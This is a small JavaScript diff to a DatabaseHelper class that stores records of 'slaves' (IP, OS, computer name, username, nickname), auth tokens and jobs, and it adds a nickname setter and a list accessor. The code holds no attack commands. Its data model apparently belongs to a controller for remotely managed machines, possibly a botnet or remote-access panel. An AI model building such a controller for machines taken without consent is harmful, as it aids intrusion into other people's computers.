@@ -20,9 +20,11 @@ class DatabaseHelper {
         this.slaves.push({
             id: slave.id,
             ip: slave.ip,
+            os: "Linux",
             computername: slave.computername,
+            nickname: "No nickname",
             username: slave.username,
-            computerinfo: slave.computerinfo,
+            info: slave.info,
         });
     }
 
@@ -63,11 +65,23 @@ class DatabaseHelper {
         });
     }
 
+    setNickname(slaveId, name) {
+
+        this.slaves = this.slaves.map(slave => {
+            if (slave.id == slaveId) {
+                slave.nickname = name; // Only change name.
+            }
+
+            return slave;
+        })
+    }
+
     getSlaveById(id) {
         return this.slaves.filter((entry => entry.id == id))[0];
     }
 
-    getAuthTokenById(token) {
+    checkAuthToken(token) {
+        
         return this.authTokens.filter((entry => token == entry.token))[0];
     }
 
@@ -77,6 +91,10 @@ class DatabaseHelper {
 
     getJobWithId(id) {
         return this.jobs.filter(entry => entry.id == id)[0]
+    }
+
+    getSlaves() {
+        return this.slaves;
     }
 }
 
